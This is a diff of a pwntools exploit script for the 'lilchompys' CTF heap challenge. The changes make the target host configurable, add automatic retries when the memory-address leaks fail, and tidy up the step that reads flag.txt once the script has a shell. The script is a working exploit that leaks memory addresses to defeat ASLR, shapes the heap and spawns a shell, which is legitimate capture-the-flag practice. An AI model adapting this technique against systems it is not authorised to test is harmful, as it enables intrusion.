@@ -1,17 +1,32 @@
 #!/usr/bin/env python3
 from pwn import *
 from itertools import cycle, islice
+import os
+import sys
 
-exe = ELF("lilchompys")
+exe = ELF(".build/lilchompys" if os.path.exists(".build/lilchompys") else "lilchompys")
 context(binary=exe)
 
-DEBUG = 0
-REMOTE = 1
-SHELL = 1
+DEBUG = args.DEBUG
+SHELL = args.SHELL not in ("", "0", "false", "False")
 
-if REMOTE:
-	r = remote("chal.2020.sunshinectf.org", 20003)
-	libc = ELF("lilchompys-libc.so", checksec=False)
+def _find_libc():
+	# The published remote libc (glibc 2.23 from the Ubuntu 16.04 base image).
+	# `pwnmake check` creates a `publish/` symlink in this dir pointing at this
+	# challenge's published files, so read the libc from there. Fall back to a
+	# bare copy sitting next to the solver if present.
+	here = os.path.dirname(os.path.abspath(__file__))
+	for p in (
+		os.path.join(here, "publish", "lilchompys-libc.so"),
+		os.path.join(here, "lilchompys-libc.so"),
+	):
+		if os.path.exists(p):
+			return p
+	return "lilchompys-libc.so"
+
+if not args.LOCAL:
+	r = remote(os.environ.get("HOST") or args.HOST or "ctf.hackucf.org", int(os.environ.get("PORT") or args.PORT or 20004))
+	libc = ELF(_find_libc(), checksec=False)
 else:
 	r = exe.process()
 	
@@ -22,6 +37,21 @@ else:
 
 if DEBUG:
 	context.log_level = "debug"
+
+def retry(msg):
+	# The leaks are printed as strings, so an address with a zero byte in it
+	# cuts them short (and some heap layouts don't work). Leak 2 comes up short
+	# roughly 1 run in 6; each connection gets a fresh process with a fresh
+	# ASLR layout, so just start over.
+	tries = int(os.environ.get("CHOMPY_TRIES", "1"))
+	if tries >= 5:
+		error(msg)
+	warn("%s; retrying with a new connection" % msg)
+	r.close()
+	os.environ["CHOMPY_TRIES"] = str(tries + 1)
+	# Rerun with the original command line: pwntools strips its KEY=VALUE
+	# arguments (HOST=..., DEBUG) out of sys.argv when it's imported
+	os.execv(sys.executable, sys.orig_argv)
 
 def menu(choice):
 	r.recvuntil(b") Submit finalized theme park design for review\n")
@@ -160,7 +190,7 @@ leak = r.recvuntil(b"(arcade game)\n", drop=True)
 # info("leak: %r" % leak)
 
 if len(leak) <= 4:
-	error("Leak 1 size is suspiciously low: %d" % len(leak))
+	retry("Leak 1 size is suspiciously low: %d" % len(leak))
 
 adj = u64((leak + b"\x00" * (8 - len(leak)))[:8])
 
@@ -197,7 +227,7 @@ leak2 = r.recvuntil(b")\n", drop=True)
 # info("leak2: %r" % leak2)
 
 if len(leak2) <= 4:
-	error("Leak 2 size is suspiciously low: %d" % len(leak2))
+	retry("Leak 2 size is suspiciously low: %d" % len(leak2))
 
 dso_handle_addr = u64(leak2 + b"\x00" * (8 - len(leak2)))
 aslr_slide = dso_handle_addr - exe.symbols["__dso_handle"]
@@ -291,7 +321,7 @@ while True:
 	if calculated_units == target_units:
 		break
 	elif calculated_units > target_units:
-		error("Heap layout isn't favorable, probably won't work")
+		retry("Heap layout isn't favorable, probably won't work")
 	
 	i += 1
 
@@ -323,6 +353,14 @@ menu(5)
 if SHELL:
     r.interactive()
 else:
-    # Got a shell, so get the flag!
-    r.sendline("cat flag.txt")
-    print(r.recvline_contains(b"sun{", timeout=2).decode("utf8"))
+    # Got a shell, so get the flag! Wait until the program has read the "5"
+    # (it starts printing the park review) before sending the command, or the
+    # command can land in the program's stdin buffer and never reach the
+    # shell. Retry in case the shell isn't reading yet.
+    r.recvuntil(b"expected park experience")
+    for _ in range(10):
+        r.sendline(b"cat flag.txt")
+        out = r.recvrepeat(1)
+        if b"sun{" in out:
+            print(next(l for l in out.decode("utf8", "replace").splitlines() if "sun{" in l))
+            break
